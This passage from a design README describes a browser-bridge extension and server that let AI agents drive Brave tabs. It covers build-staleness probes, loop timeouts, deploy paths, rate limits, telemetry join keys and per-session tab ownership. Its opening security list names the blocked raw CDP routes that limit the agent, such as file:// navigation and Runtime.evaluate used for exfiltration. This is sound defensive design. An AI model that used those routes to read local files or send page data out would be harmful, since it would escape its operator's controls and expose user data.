   (`chrome://`, `chrome-extension://`, `devtools:`, `file:`, …) — validated
   *before* the attach (`assertCdpAttachable`, `cdp_attach_refused:<scheme>`). For
   the autonomous agent the tab is FORCED (env, not model-chosen), so it can never
   attach to another tab, another profile, or the user's active tab.
2. **NO raw-CDP passthrough to the model.** The opencode typed tool exposes ONLY the
   bounded ops with typed scalars (`op`, `selector`, `text`, `key`, `frame`, `js`,
   `url`, `maxBytes`). There is **no `cdp`/`method`/`params` field** — the model can
   never send an arbitrary CDP command (`Page.navigate file://`, `Browser.*`,
   `Target.*`, exfil `Runtime.evaluate`). `buildRequest` constructs the wire body
   from a **whitelist**, so any smuggled field is dropped, never forwarded. This
   preserves the PR #180 RCE-closed property (typed ops only, no command string).
   The extension likewise has no generic "run this CDP method" endpoint.
3. **Always detach** (per-op `finally` + `onDetach`) — no leaked attachment.
4. **Metadata-only telemetry** (see below) is unchanged: op/domain only — never
   frame URLs, typed text, eval source, or screenshot bytes. CDP ops count against
   the per-instance rate limit (#178).

**Tradeoff:** a CDP op briefly shows Brave's debug banner. A simple top-frame
`text`/`html`/`eval` or a foreground `screenshot` takes the lighter non-CDP path
(no banner). **The manifest gained the `debugger` permission → the extension needs
a manual reload** (and Brave may re-prompt for the permission).

**⚠ Reloading (↻) the extension is UNRELIABLE — a full Brave restart is the
reliable fix.** The extension's long-poll (`GET /poll`) keeps the OLD service
worker permanently alive, so clicking ↻ in `brave://extensions` frequently does
NOT swap in the new build. Symptom of a stale extension: a NEW op (e.g. `upload`
on a pre-0.2.0 build) returns a server-side op-level **`unknown_op`** — the server
knew the op and dispatched it, but the old service worker didn't. The **CLI maps
that to a clear reload/restart message + non-zero exit**, and **`browser health`
shows the loaded `extension_build` vs `extension_build_current` plus an
explicit `extension_stale` verdict** so you can confirm. 🔴 A full quit/reopen of
Brave has been MEASURED not to be sufficient either (2026-08-04: oldest browser
process 392 s, deploy 9 h earlier, still running the old code) — the reliable
step is a **per-profile Remove + Load unpacked** at `brave://extensions`. Never
`pkill` Brave — `restore_on_startup` is unset on both profiles, so the operator's
tabs would be gone for good.

### `browser ping` — the deterministic "is the new build loaded?" probe

```bash
browser --instance <label> ping
# NEW → {"pong":true,"extensionVersion":"0.8.0","buildMarker":"<hex>","id":"<ext-id>","ops":[…]}
# OLD → op 'ping' returned unknown_op — … FULLY RESTART Brave …        (exit 1)
```

🔴 **Read `buildMarker`.** It is the only field that describes the RUNNING CODE
(a literal in the loaded module graph); `extensionVersion` and `id` both describe
the load DIRECTORY, so two profiles on one directory report identical values
while running different code (#324). Compare it against `whoami`'s
`bridge.extension_build_current`, and check **every** profile — staleness is
per-profile.

Pass `--instance`: with two profiles connected, a bare call gets
`409 ambiguous_instance` instead of an answer.

`ping` is a no-tab, no-page op whose entire purpose is its **name**: a build that
predates it fails validation with `unknown_op`, so it cannot fake a pass. It
answers the reload question with a yes/no instead of a comparison of two version
strings that an unbumped change would defeat.

**`id` = `chrome.runtime.id`, which answers the OTHER question: which DIRECTORY
did Brave load?** An unpacked extension's id is derived from its absolute path,
so a repo-path build and a deployed-path build at the SAME version report
DIFFERENT ids. Without it there is no programmatic way to confirm the migration
took — only reading the path off `brave://extensions` by hand. Surfaced per
instance as `extension_id` in `whoami`/`health`, next to
`bridge.extension_dir_expected` (the directory Brave should be pointed at).

✅ **MEASURED (2026-08-01).** The id is `sha256(absolute path)` → first 32 hex
chars → each nibble `0-f` mapped to `a-p`:

```python
h = hashlib.sha256(path.encode()).hexdigest()[:32]
ext_id = "".join(chr(ord("a") + int(c, 16)) for c in h)
```

Three independent confirmations: the formula reproduces the
`pkkoninbaeicfalpdkkmcknhnacjjjpi` the laptop reported while loaded from
`/home/zach/workspace/devrc/scripts/browser-bridge/extension`; it *predicted*
`bgbkamdlkdleahpgdgmjipjbgmepgenk` for
`/home/zach/.local/share/browser-bridge-ext` and `ping` returned exactly that
after the re-point; and the hash takes the **path only, with no profile
component** — both laptop profiles on one path report one id (measured twice,
repo path then deployed path), and the workbench reports the same
`pkkoni…` for the same absolute repo path.

⚠ **Scope:** Brave/Chromium on the two NixOS hosts, **unpacked** extensions, two
paths. Not generalised to packed extensions or other browsers.

**Consequence:** the id an operator should see is now **predictable in advance**
from the target path, so a re-point can be checked against a computed
expectation instead of only before-vs-after. Read the "before" id off the
`brave://extensions` card **before clicking Remove** (Remove wipes
`chrome.storage.local`). The server still **does not compute an expected id** —
that is a deliberate follow-up needing its own PR, not an oversight; see
`extension/README.md` → "The path→id derivation (MEASURED)".

**Contract for any extension change that must be provably loaded:** bump
`extension/manifest.json`'s `version` AND add a new discriminator (a new op name,
or a new field in `ping`'s reply). Without one, reload-vs-restart is
unfalsifiable — that ambiguity cost three full Brave restarts in one session.

### The no-wedge guarantee (0.4.0) — why an instance used to need a manual ↻

Until 0.4.0 an instance would silently stop answering and stay dead until the
operator clicked ↻ in `brave://extensions`. Root cause (diagnosed 2026-07-31,
`claudedocs/browser-bridge-silent-drop-diagnosis-2026-07-31.md`): an **unbounded
`await` inside `execute()`** parks the `while (true)` poll loop forever. `loop()`
is guarded by a non-reentrant module global — `if (running) return` — whose reset
lives in a `finally` a parked loop can never reach, so the 1-minute
`bridge-keepalive` alarm fired on time, called `loop()`, hit the guard and did
nothing. Only a fresh service-worker evaluation cleared it.

**The counter-intuitive part: the CDP path was never the culprit — it is the one
path that was already bounded** (`withCdpSession`, 8s attach / 8s command / 15s
op). The unbounded awaits were the *non*-CDP `chrome.*` calls: `frames` →
`webNavigation.getAllFrames`, the `screenshot` fast path →
`tabs.captureVisibleTab`, `targetTab()` → `tabs.get`/`tabs.query`, and
`pollOnce`'s bare `fetch`. Both recorded drops are immediately preceded by a
`cmd_timeout` on exactly those ops, while ops that timed out through the bounded
CDP path did **not** kill the instance.

Two changes close it:

1. **Every op is bounded at ONE choke point** — `execute()` races
   `OPS[cmd.op](cmd)` against `EXEC_OP_BUDGET_MS` (18s). `frames`/`screenshot`
   are deliberately **not** patched individually — one rule, one place, or the bug
   regenerates at the next op added (`targetTab()` alone is on the path of every
   op). Every *other* await in the loop body is bounded too: the poll fetch
   (`POLL_BUDGET_MS` 40s), the result POST (`RESULT_BUDGET_MS` 10s), and the
   `chrome.storage.local` reads in `config()`/`clearSuperseded()`
   (`STORAGE_BUDGET_MS` 5s) — the last of which runs on *every* healthy iteration,
   i.e. more often than `frames`/`screenshot` ever did. Fetches additionally carry
   an `AbortSignal` so the socket is torn down rather than abandoned.

   ⚠ **The budget ordering is not the tidy `CDP 15s < exec 18s < server 20s` it
   looks like.** `withCdpSession` *composes* its phases: attach ≤8s + run ≤15s +
   an awaited detach ≤8s = up to 31s. So a hung CDP `run` with a slow detach hits
   the 18s exec bound first and reports `op_timeout:<op>`, losing the precise
   `cdp_timeout:` label. That is accepted deliberately — the caller-visible
   ceiling is the *server's* 20s `cmd_timeout`, so raising the exec budget past
   31s would only park the loop longer for an envelope that could never arrive,
   and pre-change that same case produced a bare `cmd_timeout` with no phase at
   all. The attach-hang and per-CDP-command-hang cases still surface their exact
   `cdp_timeout:attach` / `cdp_timeout:<method>` — but the attach margin is
   **thin, not comfortable**: a hung attach is 8s attach + an *awaited* detach of
   up to 8s = **16s against the 18s bound, i.e. 2s of headroom** (measured at 10×
   scale). Lowering `EXEC_OP_BUDGET_MS` below 16s, or raising either CDP timeout,
   turns that case into a generic `op_timeout`. Known cost: a slow-but-successful
   CDP op in the 18–20s band is now killed at 18s.

   ⚠ The 18s ceiling is **hard**, and it silently caps the server's
   env-configurable `BROWSER_BRIDGE_CMD_TIMEOUT` (default 20s). Raising that env
   var to 60s for a slow page buys nothing for any op routed through `execute()`
   — the extension still gives up at 18s. Only a matching `EXEC_OP_BUDGET_MS`
   bump (full Brave restart) actually extends it.
2. **The keepalive can now recover** — `keepaliveTick()` (not a bare `loop()`)
   compares `lastLoopTickAt` against `LOOP_STALL_MS` (180s). A loop that has not
   stamped in that long is retired via a generation bump and a fresh one takes the
   latch. This is the defence against the *next* unbounded await someone adds, not
   the primary fix.

   The margin is **1.59×**, not the 2.5× an earlier draft of this section claimed
   — that figure counted only poll+exec+result (68s) and omitted the storage
   bounds introduced by the same change. Derived term by term from the loop as it
   stands: `config` 5s + `poll` 40s + `clearSuperseded` (get+set) 10s + `execute`
   18s + `postResult` 10s + a post-failure backoff (30s cap + 250ms jitter) =
   **113.25s**. The conclusion holds — every term is a *bound*, not an
   expectation, and a real iteration is milliseconds — but adding another bounded
   await to the loop body eats into that margin, so re-derive the sum when you do.
   The full table is in `extension/protocol.js` next to `LOOP_STALL_MS`.

   Duplicate **polling** is guarded by re-checking the generation with **no await
   between the check and the `fetch`**. That check therefore lives *inside*
   `pollOnce()`, not in `loop()`: `activeTabSnapshot()` (`chrome.tabs.query`) sits
   between them, and a retirement landing in that window let the retired loop sail
   into the poll (measured through the real `keepaliveTick` path:
   `maxConcurrentPolls = 2`). The check has now occupied three positions — top of
   iteration, before `pollOnce`, and inside it — each move forced by the guarantee
   being falsified one frame deeper, so the rule to remember is the *invariant*,
   not the location. A retired loop *may* still finish posting a result it had
   already dequeued; that is deliberate, since dropping it would strand the caller
   until its `cmd_timeout`, and the server correlates results by command id (cids
   are unique per submit and a timed-out submit has already stripped the outbox,
   so a late post is a no-op, never a misroute).

Regression coverage: `tests/loop_wedge.test.mjs` wedges a real op with a
never-settling promise and asserts the loop releases and keeps polling. It is
**mutation-tested** — removing the `promiseWithTimeout` from `execute()` turns
both wedge tests red.

### `known_instances` / `missing` — a dead named instance can no longer hide

`/health`'s `extension_connected` is a bare OR across live instances, so with two
profiles wired up it stayed `true` while `work` had been gone for an hour. It is
**not** redefined (callers legitimately use it for "is anything up"); the truth is
carried alongside:

* `known_instances[]` — every routing key seen this process lifetime, each with
  `connected`, `last_seen` (ISO-8601 UTC), `last_seen_age_s` and
  `last_unanswered_op`;
* `missing[]` — the subset that is no longer live.

A key that has been gone longer than `KNOWN_FORGET_S` (24h) is dropped from both,
so an operator who normally runs one profile does not get a permanent
`other: DISCONNECTED` nag. A warning that is always on is a warning nobody reads.

⚠ **`last_unanswered_op` means "not answered within `cmd_timeout`", not "never
answered".** A late result that arrives after the caller's `submit` gave up is
dropped, and `last_dispatch` is only cleared on the delivering path — so the field
can name an op that eventually completed. It is a lead, not a verdict.

`browser health` renders one **stderr** line per gone instance (stdout stays
machine-parseable JSON):

```
browser: work: DISCONNECTED (last seen 2026-07-31T18:02:34Z, last unanswered op: frames)
```

The same `known_instances` block rides on the fail-fast `404 unknown_instance`
and `503 extension_not_connected` bodies, so a mistyped `--instance` and a
profile that silently died are distinguishable at the point of failure.

**The detector.** The server logs `instance_lost` (edge-triggered, once per
transition) naming the key, the staleness, and **the id/op of the last command
dispatched to it that never produced a result** — the single fact that would have
identified `frames` on 2026-07-29 without any code reading — plus
`instance_connected` when it comes back. Before this, a drop left no trace at all
unless somebody happened to send a command into it, which is exactly why one of
the two observed drops appears nowhere in the journal.

⚠ **The detector is PROBE-DRIVEN, not autonomous.** There is no reaper thread:
liveness is evaluated inside `_live_instances_locked`, which only runs when
something asks (`/health`, `/instances`, `/whoami`, a `/cmd` dispatch). So
detection latency is "time until the next probe", and the `stale_s` in the event
is measured at probe time, not at the moment of the drop. A bridge nobody touches
for an hour logs `instance_lost` an hour late, with an hour of staleness. That is
a deliberate trade — one definition of "live", no background thread that could
disagree with it — but it is not a monitor.

### Where the extension loads from (git-immune deploy path)

`home-manager switch` copies `extension/` to **`~/.local/share/browser-bridge-ext/`**
(`home.activation.browserBridgeExtension` in `nix/home.nix`) and **Brave should be
pointed there**, not at the repo tree. devrc is worked on by many concurrent
sessions; loading the extension out of the working tree lets any other session's
`git checkout`/`stash`/branch switch/worktree op swap the code out from under a
live verification (measured — it reverted a staged build mid-session on
2026-07-30).

⚠ **Honest scope: "git-immune" means immune to git, not to everything.** A
`home-manager switch` (or `ship.sh`) rewrites the deployed tree from whatever the
working tree holds at that moment, so a concurrent session on another branch can
still swap the extension mid-verification. What the deploy eliminates is the
**silent** class (a checkout with no switch); a switch is at least explicit and
logged. `ping` covers the rest by making it detectable.

⚠ **Flake trap:** flakes only see git-TRACKED files, so a NEW extension file that
has not been `git add`ed is silently omitted from the deployed tree — a
partially-updated extension with no error anywhere. `git add` new extension files
before switching.

It is a **real copy** (`cp -rL` into a sibling temp dir, then a single `mv -T`),
not `home.file … recursive = true`: that would deploy a tree of read-only
/nix/store symlinks, and whether Chromium's unpacked-extension loader accepts
those is something only live Brave can answer — a wrong guess costs a full Brave
restart to discover. A copy removes the question and is equally git-immune. Cost:
the tree is rewritten on every switch.

**The swap is `mv -T --exchange` (renameat2 `RENAME_EXCHANGE`)**, with a
rename-away fallback for a filesystem that lacks it. Two earlier designs were
rejected:

- *hash-suffixed dir + symlink flip* — the extension ID is path-derived and
  `ping`'s `id` depends on it being stable across switches. A target whose name
  changes each switch risks changing the ID each switch (whether Chromium
  canonicalises a symlink before hashing is unmeasured), defeating the probe and
  possibly forcing a re-point per switch.
- *`rm -rf` then `mv -T`* — measured to **delete the deployed tree** under two
  concurrent activations (3/3 trials: one side exits 0 having installed its tree,
  the other then removes it and aborts). An absent directory is precisely the
  mid-verification breakage this deploy exists to prevent, so this was strictly
  worse than the nesting bug it replaced.

`RENAME_EXCHANGE` needs no trade-off: it swaps the two directories in one
syscall, so the path is never absent and never changes, and the OLD tree lands at
the temp name for cleanup only *after* the swap succeeded — a failed deploy
therefore leaves the previous extension in place rather than nothing.

🔴 **The two paths do NOT have the same guarantee, and the difference is
measurable.** The exchange path never exposes an absent or partial tree at the
destination. **The fallback briefly does** — it renames the old tree away and
then installs, and between those two syscalls nothing exists at the path. That
window is inherent to the fallback and is not a concurrency artifact: a single
writer with no contention hits it. The deploy therefore prints a runtime warning
naming the window whenever it falls back, and states what to do if a Brave reload
landed in it (re-run the switch). Do not read "atomic swap" as covering both
paths; on these hosts (ext4, coreutils 9.11) the fallback should never fire.

Measured on the RENDERED activation script (the Nix literal put through
`nix-instantiate --eval`, so shell-level escaping is covered too) under
`set -eu -o pipefail` against a scratch `HOME`, 400-file source:

| case | result |
|---|---|
| first install / idempotent re-run / 0555 previous tree | rc=0, 400 files |
| symlinked destination | link replaced, target intact, target mode unchanged |
| **exchange path, single writer, sampled throughout, 4/4** | **observer saw NO absent, partial or non-dir state** |
| **exchange path, 4 concurrent writers, jittered starts, 6/6** | **all rc=0, 400 files, observer clean, 0 nesting, 0 leftovers** |
| **fallback path (exchange forced off via a `mv` shim), single writer, 4/4** | **observer saw `ABSENT` every time** — the window above, reproduced |
| sweep: empty-suffix / dead-PID / non-numeric / live-PID leftovers | swept / swept / spared (deliberate) / spared |

Every failure exit in the deploy prints a named `browser-bridge: …` message
saying what happened to the previous tree (unchanged, restored, or left at
`.old.<pid>` for manual recovery) before aborting the switch — there are no bare
`mv:` exits left.

Re-pointing Brave is a **manual, one-time, per-profile** step (`brave://extensions`
is not scriptable) — the exact sequence, and the rollback procedure, are in
`extension/README.md`. Until an operator does it, the previously loaded repo-path
extension keeps working unchanged; nothing removes the repo `extension/` directory.

## Concurrency backstop (per-instance rate limit + queue cap)

The extension is a **single serial connection**, and the transport used to accept
`/cmd` dispatches with **no backpressure**. An audit found a 44,061-event storm —
**43,991 `eval`s in one hour (~13/sec sustained)** from an unisolated fleet/loop —
that saturated one instance's queue and ballooned latency from ~10 ms to ~5.5 s.

To bound that damage the server enforces two **per-instance** limits (the
extension is the bottleneck, so throttling instance A never affects instance B):

- **Token-bucket rate limit** on accepted `/cmd` dispatches: `BROWSER_BRIDGE_RATE_PER_SEC`
  sustained (default **5/sec**), `BROWSER_BRIDGE_BURST` burst (default **20**). A
  dispatch that would exceed the bucket is **rejected** (never silently queued).
  `RATE_PER_SEC=0` disables it (power-user unlimited). When rate-limiting is
  active (`RATE_PER_SEC>0`), `BURST` is **clamped to ≥1** — a sub-1 burst can
  never hold a whole token, so it would silently rate_limit *every* `/cmd`
  forever; use `RATE_PER_SEC=0`, not a 0 burst, to disable throttling.
- **Queue-depth cap** `BROWSER_BRIDGE_MAX_QUEUE` (default **32**): if an instance's
  pending (admitted-but-unfinished) command count is at the cap, new `/cmd` are
  rejected until it drains — this bounds the latency tail. `MAX_QUEUE=0` disables it.

A rejected dispatch returns **HTTP 429** `{"ok":false,"error":"rate_limited"|"queue_full","retry_after":<s>}`
(caller-visible backpressure). The `browser` CLI prints a back-off message and
exits non-zero, so a runaway loop gets a hard, detectable signal. **The defaults
do not hurt legitimate use:** an interactive/agent workflow is a handful of ops
per burst (well under burst 20 and depth 32); only a sustained high-rate flood is
throttled.

The admission check runs **under the existing lock**, is lock-free of any blocking
wait, and rejects **before** the command joins the per-tab FIFO turnstile — so it
can neither deadlock nor wedge the turnstile (a rejection returns immediately,
leaving no orphaned waiter). The audited concurrency core (single `Condition`, no
lock held across a blocking wait, turnstile self-releases in `finally`) is
unchanged.

**Observability (so the next storm is attributable):** a throttle both `log()`s a
distinct `{"event":"throttled","key":…,"reason":…,"sess":…}` line AND emits a
telemetry event (`outcome="throttled"`, `payload.reason`) into `activity.events`.
`payload.sess` is a **coarse, non-reversible** fingerprint (first 8 hex of
sha256 of the `X-Session-Id`), kept metadata-only (no page content). This is the
ONLY event that carries the session hash.

`sess` was **kept** when the `session` join key landed (below) rather than
replaced by it: the column is filled for the `claude:` tier and non-nested calls
only, so a flood driven from a `tmux:`/`sid:`/`ppid:`/untagged id — or from a
nested `browser agent` run — is exactly the case where you still need *some*
stable handle to tell one flooder from two.

## Session as a telemetry join key

**The bug (measured 2026-08-18).** Every `source='browser-bridge'` row in
`activity.events` had an **empty `session` column** — 0 of 6,937 over 14 days —
while `claude`, `opencode`, `keys`, `tmux` and `zsh` filled it 100%. The value
already reached the server (`X-Session-Id`, used for tab-ownership routing); it
was simply never passed to `emit_cmd_event`. So a browser-skill call could not be
joined to the agent session that made it, and "which sessions used the browser
skill" had to be answered by scanning 1.5M transcript records.

### Hazard 1 — only one tier is a join key

The id is **tagged** with the tier that produced it (everything before the first
`:`), and the server reads that tag. Reading a tag the CLI emits on purpose is not
shape inference; deciding from the value's *form* ("looks like a uuid → claude")
would be, and is forbidden.

| `X-Session-Id` | `payload.sess_src` | fills `session`? | why |
|---|---|---|---|
| `claude:<uuid>` | `claude` | **yes** — the bare `<uuid>` | it IS Claude Code's session uuid, the same value `source='claude'` rows store |
| `tmux:%3` | `tmux` | no | a pane id is stable across **many unrelated sessions**; storing it would silently merge them — worse than empty |
| `sid:<sid>:<start>` | `sid` | no | no other source records it |
| `ppid:<pid>:<rand>` | `ppid` | no | last-resort random token |
| `synthetic:…` | `synthetic` | no | an id the CLI made up on purpose (the `emulate --recreate` close) |
| anything untagged, absent, or empty | `unknown` | no | fail closed |

Only the **first** colon splits (a `sid:`/`ppid:` id contains more). An id with no
tag is **never** promoted — a bare uuid is exactly the value it would be tempting
to accept, and the opencode tool's own default is the literal `browser-agent`.

### Hazard 2 — a nested `browser agent` run is not its invoker

`browser agent` captures the id of the session that **invoked** it
(`--print-session-id`) and forwards it to the nested opencode tool, which sends it
as `X-Session-Id`. Right for routing and the audit trail; **wrong** for the
`session` column, which means *the agent session that issued this command*. Left
alone, one `browser agent "<goal>"` call would become N browser calls credited to
the operator's own session — fabricated rows in the `session` JOIN column
(~581 nested rows in 14d, ~11% of bridge commands).

So the nested tool declares `X-Session-Origin: browser-agent`. When that header is
present the server writes **no** `session`; the forwarded id is recorded as
`payload.origin_session` (the causal **parent**) beside `payload.origin`. Giving
the nested session an id of its own is a later change.

### Hazard 3 — `CLAUDE_CODE_SESSION_ID` leaks into opencode

opencode sets `process.env.OPENCODE="1"` in a yargs **top-level `.middleware()`**
— registered before every `.command(...)`, so it runs for every subcommand — and
hands its tool shells `{...process.env}`. Launch opencode from a Claude Code bash
call and the outer session's `CLAUDE_CODE_SESSION_ID` rides all the way down: a
live env dump from inside an opencode bash tool still had it.

Derived against the **pinned** build (`PINNED_VERSION` in
`scripts/tests/test_opencode_engine.py`) — named rather than copied so it cannot
go stale — and confirmed byte-identical in the newer build on this host's own
profile, which is the one a real `opencode run` here actually executes. The
assignment is therefore not specific to whichever of the two you land on.

So inside opencode that variable names an **ancestor**, not the session issuing
the command. A plain `opencode run …` whose bash tool shells out to `browser`
would otherwise have the bridge credit the **outer** Claude session with browser
usage it never performed.

**🔴 The id is indistinguishable from a direct call.** There is nothing in it to
branch on: it *is* the outer session's id, correctly tagged `claude:`. So the
server cannot tell the two apart by inspection — the caller has to say so.

That is the **same question** `browser agent` already answers (hazard 2), so it
gets the **same mechanism**: `X-Session-Id` is left completely alone and the
nested-run fact travels beside it.

```
X-Session-Id:     claude:<uuid>        # unchanged — routing, ownership, not_owned_tab
X-Session-Origin: opencode-inherited   # this command was issued by something nested
```

`origin` is a two-value enum — `browser-agent` | `opencode-inherited` — both
meaning "issued by something nested under `origin_session`", which is precisely
true of both cases. The server needed **no change**: the origin path already
suppresses `session` and records `payload.origin` + `payload.origin_session`.

Why this beats re-tagging the id, which was tried first and rejected:

- **Routing is byte-identical.** Tab ownership, `--tab`, `not_owned_tab` and the
  `$( … )` stability property are untouched, because the id is untouched. A
  re-tagged id would have silently stopped an opencode-inner call from sharing
  ownership with its outer session. The equivalence is now machine-checked: the
  id is derived with and without `OPENCODE` and both must equal the same pinned
  literal.
- **One question, one mechanism.** Two ways to say "this is nested" inside one
  system is a defect regardless of which is better in isolation.
- It reuses a path that is already tested, rather than adding a parallel one.

The origin is declared only when a Claude id was **actually inherited** — the
condition reads the *derived* id (`claude:*`) rather than re-testing the env
vars, so it cannot drift out of step with the precedence chain. An opencode
session run interactively with no Claude ancestor derives `tmux:`/`sid:`/`ppid:`,
declares nothing, and behaves exactly as it does today.

**This is temporary.** A follow-up adds an opencode `shell.env` hook exporting
`OPENCODE_SESSION_ID`; `derive_session_id` then gains a **joinable** `opencode:`
tier, nested runs get a key of their own, the `claude:*` case stops matching on
its own, and the token becomes dead code to delete. The slot is marked in the
source.

### Contract

- `payload.sess_src` is **always** set on a `/cmd` event, so every row is
  self-describing about why it does or does not carry a key.
- `session` holds the **bare** id (the tag stripped) so it compares `=` against
  `source='claude'` rows with no `replaceOne()` at the join site.
- Stored **raw, not hashed** — deliberately. A hash would make browser-bridge the
  one source needing `hex(SHA256())` at query time, and a forgotten join returns
  zero rows, which reads as a valid "no sessions matched" answer.
- An id over 200 chars or carrying a control character is **dropped whole**, never
  truncated — a truncated join key is a *wrong* join key.
- **Only the heartbeat** is server-originated and carries none of these fields.
  `/whoami` and `/health` are **operator** calls — `browser whoami` / `browser
  health` are subcommands a person runs, and the CLI sends its ordinary session
  headers on them because `_curl` is one code path — so they are attributed like
  any other command. They were previously excluded on the stated grounds of
  having "no caller session", which was false for these two and made ONE
  operation have TWO outcomes: `whoami` via POST `/cmd` was attributed, the same
  `whoami` via GET was not (125 rows, 2.0% of `kind='cmd'` over 14d).
- Both header vocabularies are **validated closed sets**, not documentation. A
  `sess_src` tag outside the tier list becomes `unknown` and carries no id; an
  `origin` outside the two tokens is recorded as `invalid`. Both arrive on
  caller-supplied headers, so without this each is an unbounded-cardinality
  column.
- **Origin suppression keys off header PRESENCE, never the value.** Any present
  value — including empty, oversized or control-char — suppresses `session`.
  Losing attribution beats fabricating it.
- `origin_session` passes the **same tier gate** as `session`: a non-joinable
  parent id (`tmux:`/`sid:`/`ppid:`) is not recorded, because a reader grouping by
  it would merge unrelated sessions exactly as they would on `session`.
- `kind='cmd'` is unchanged — it is the usage signal `adoption-scan.py` reads.
- Best-effort is unchanged: every field above is written inside `emit_cmd_event`'s
  swallowing `try`, off the critical path.

**Privacy.** A deliberate widening of the metadata-only contract, and a narrow
one: the agent session's own opaque handle is not page content, is not derived
from anything the browser saw, and is minted by the local agent harness before
any browser command exists. It says *who asked*, never *what was browsed*.

### What this makes answerable — and what it does not

**Answerable once this ships — which Claude sessions used the browser skill, and
how much:**

🔴 *"Once this ships", not "now": `session` is filled by code that is not
deployed yet, so this returns **0 of 6,166** browser-bridge `kind='cmd'` rows
today (measured over 14d). Merged is not deployed — every `home.file` target here
changes only on a `home-manager switch`, and reading these queries as live before
that is the same silent-empty-result trap the replaced query fell into.*

```sql
SELECT session, count() AS browser_calls,
       min(ts) AS first_call, max(ts) AS last_call
FROM activity.events
WHERE source = 'browser-bridge' AND kind = 'cmd' AND session != ''
GROUP BY session
ORDER BY browser_calls DESC
```

`session` holds the bare Claude session uuid, so it joins straight against
`source='claude'` rows — same column, same values, no transform:

```sql
SELECT count(DISTINCT session) AS joinable_browser_sessions
FROM activity.events
WHERE source = 'browser-bridge' AND kind = 'cmd' AND session != ''
  AND session IN (SELECT DISTINCT session FROM activity.events WHERE source = 'claude')
```

🔴 **NOT answerable yet — "which sessions used opencode AND the browser skill".**
That was this change's motivating question and it is still open, for two
independent reasons, either of which alone is fatal:

1. **The id spaces are disjoint.** `source='opencode'` sessions are `ses_`-prefixed
   opencode ids; `source='claude'` sessions are uuids. Measured over 14 days: 406
   distinct claude sessions, 183 distinct opencode sessions, **overlap 0**. A query
   joining `browser-bridge.session` against opencode's `session` cannot match — and
   it fails as a **silent empty result**, which reads exactly like a truthful
   "no sessions matched".
2. **Those calls deliberately carry no `session`.** A browser call issued from
   inside opencode is the leak case above: it is marked with
   `origin='opencode-inherited'` and attributed to nobody.

An earlier draft of this README shipped exactly that broken join as its flagship
example. It is replaced rather than annotated, because a wrong query that returns
zero rows is worse than no query.

**What would make it answerable:** the follow-up `shell.env` hook exporting
`OPENCODE_SESSION_ID`, which gives nested runs a joinable `opencode:` tier of
their own. Until then, use `origin='opencode-inherited'` to *count* opencode-driven
browser usage — you can see how much there is, just not whose:

```sql
SELECT JSONExtractString(toString(payload), 'origin') AS origin, count()
FROM activity.events
WHERE source = 'browser-bridge' AND kind = 'cmd'
GROUP BY origin ORDER BY count() DESC
```

## Session isolation (concurrent-session tab clobbering)

The transport is correct (each `/cmd` gets a unique cid, a FIFO outbox, and a
cid-correlated reply — no cross-delivery). The old clobber was **semantic**:
every op targeted "the active tab of the last-focused window", so two Claude
sessions driving one instance interleaved on **one shared tab** (A `nav X` then
`getHtml`; B `nav Y` in between; A reads Y). Command-level serialization existed;
per-session (multi-step **workflow**) isolation did not.

**Fix — a per-session owned tab:**

- **Per-session id.** The `browser` skill sends a stable `X-Session-Id` on every
  `/cmd`, derived (in order) from `CLAUDE_CODE_SESSION_ID` (Claude Code's own
  session UUID — identical across every Bash-tool call in a session, verified on
  the 2.1.x CLI) → `CLAUDE_SESSION_ID` (defensive alternate) → `$TMUX_PANE` (each
  session runs in its own tmux pane) → the **POSIX session id**
  (`sid:<sid>:<leader-starttime>` from `/proc/self/stat`) → (procfs-less systems
  only) a random token cached under the shell's PPID. It is used for
  **routing only** and is **never** trusted for auth — bearer + Host still gate
  every request. If two sessions ever resolve the same id they share a tab
  (documented degradation — no worse than before).
- 🔴 **The tier tag before the first `:` is load-bearing for telemetry too.**
  `server.py` parses it to decide whether the id is a joinable session key — see
  "Session as a telemetry join key" above. Adding a tier means deciding which it
  is; never emit an id whose tag misdescribes it.
- **⚠ Why the POSIX session id, and not `$PPID` (fixed 2026-08-01).** The
  PPID-keyed token was **not stable across a command substitution**: a `$( … )`
  that forks gives `browser` a different parent pid, so
  `T=$(browser open … | …)` registered tab ownership under one id and the
  following `browser --tab "$T" emulate` presented another → `not_owned_tab`.
  Measured over ssh on the workbench (`CLAUDE_CODE_SESSION_ID` unset there, so
  the fallback actually ran). A subshell cannot leave its POSIX session — only
  `setsid(2)` can — so the session id is stable across subshells while still
  differing between two ssh logins, two tmux panes and two systemd units, which
  is what keeps per-session tab isolation intact. The `<leader-starttime>`
  suffix defuses pid reuse. See
  `reference/tabs-instances.md` → "The subshell hazard".
- **⚠ Sibling subagents share identity (known limitation).** Per-session
  isolation covers concurrent **top-level** sessions, NOT sibling subagents of
  one parent. Empirically (dumped from inside two parallel subagents) a subagent
  inherits the **parent's** `CLAUDE_CODE_SESSION_ID` *and* runs in the same
  `$TMUX_PANE`, and the harness injects **no** subagent-unique, stable env var
  (no agentId/taskId/tool-use id is visible to the subagent's own shell), so two
  sibling subagents derive the SAME session id and would own the same tab. The
  robust fix is **explicit tab handles**: each such driver runs `browser open`
  (which returns a real `tabId`) and then threads its OWN `--tab <id>` on every
  subsequent op. An explicit `--tab` **overrides** owned-tab routing entirely, so
  two indistinguishable drivers never collide. See SKILL.md → Concurrent drivers.
- **Ownership.** `browser open [url]` creates a tab (background, `active:false`,
  so parallel sessions don't fight over the foreground) and the server records
  `(instance_key, session_id) -> tabId`. That session's tab-scoped ops then route
  to its tab; a session with **no** owned tab falls back to the active tab (the
  one-shot read path). `--tab <id>` overrides explicitly. `browser close` closes
  the tab + drops ownership; `browser release` drops ownership only.
- **Idempotent `open` (no orphaned tab).** A second `open` from a session that
  already owns a **live** tab returns that SAME tab (the server passes the owned
  tabId as `reuseTabId`; the extension reuses it) instead of creating a second
  real tab — so a double `open` never orphans/leaks the first tab. If the owned
  tab is **gone**, `open` transparently creates a fresh one.
- **Self-heal on a vanished owned tab.** If the user manually closes an owned
  background tab, the next tab-scoped op dispatches the stale tabId and the
  extension returns `owned_tab_gone` (ok:false). The server then **drops** that
  session's ownership so the NEXT command self-heals to the active-tab fallback
  (instead of staying wedged to the dead tab until the TTL reclaims it). `browser
  close` clears the mapping **unconditionally** — even when the tab was already
  gone — and the extension treats an already-gone close as success (idempotent).
- **FIFO on remaining contention.** With isolation most sessions use different
  tabs and don't contend. When two commands DO target the same tab (both active,
  or one `--tab`s another's owned tab) they are serialized **FIFO in arrival
  order** — competing commands **queue** (blocking) rather than fail-fast,
  bounded by `cmd_timeout` so a queued command can't block forever. Commands to
